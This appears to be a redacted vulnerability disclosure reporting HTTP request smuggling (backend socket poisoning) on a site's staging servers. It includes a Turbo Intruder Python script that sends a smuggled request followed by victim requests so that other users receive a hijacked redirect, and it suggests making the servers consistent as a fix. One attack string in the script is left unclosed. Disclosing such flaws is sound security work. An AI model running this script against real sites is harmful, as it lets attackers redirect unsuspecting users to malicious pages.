Summary:

**Summary:**


**Description:**
The sites at █████████ and ww.██████████ are vulnerable to backend socket poisoning which enables attackers to hijack responses to other users.

This vulnerability occurs because the backend server regards` \n` as a valid header ending, whereas the backend only thinks `\r\n` is valid. This means it's possible to send requests that are interpreted differently by the two servers, leading to backend socket poisoning.

## Impact
Unauthenticated, remote attackers can randomly redirect active users to malicious websites, with no user-interaction required.

## Step-by-step Reproduction Instructions
To replicate this with minimal risk of affecting legitimate users we'll target stage.████████ instead of ██████████, and use the following turbo intruder script:

I've hard-coded the endpoint to ██████████ because it appears that you've got multiple endpoints for stage.█████████ and some are not vulnerable.
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint='https://██████████:443',
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False,
                           maxRetriesPerRequest=0
                           )
    engine.start()    

    attack = '''POST /████ HTTP/1.1
Fooz: bar\nTransfer-Encoding: chunked
Host: stage.█████
Accept-Encoding: gzip, deflate

GET███████ HTTP/1.1

    engine.queue(attack)

    victim = '''GET /foo.jpg?x=%s HTTP/1.1
Host: stage.████████
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: keep-alive

'''
    for i in range(15):
        engine.queue(victim, i)
        time.sleep(0.2)


def handleResponse(req, interesting):
    table.add(req)

 ```
You should observe that one of the responses to a victim request is a 302 redirect to █████████

## Suggested Mitigation/Remediation Actions
When I resolve stage.███ I get a bunch of IP addresses, and only some of these appear to be vulnerable. As such, you should be able to resolve this issue by making these servers consistent:

```
stage.████████.		59	IN	A	██████████
stage.████.		59	IN	A	████████
stage.█████.		59	IN	A	██████
stage.███████.		59	IN	A	█████
stage.████.		59	IN	A	██████████
stage.██████████.		59	IN	A	█████
```

## Impact

Unauthenticated, remote attackers can randomly redirect active users to malicious websites, with no user-interaction required. Socket poisoning also enables a variety of other attacks which I haven't time to explore on your site.
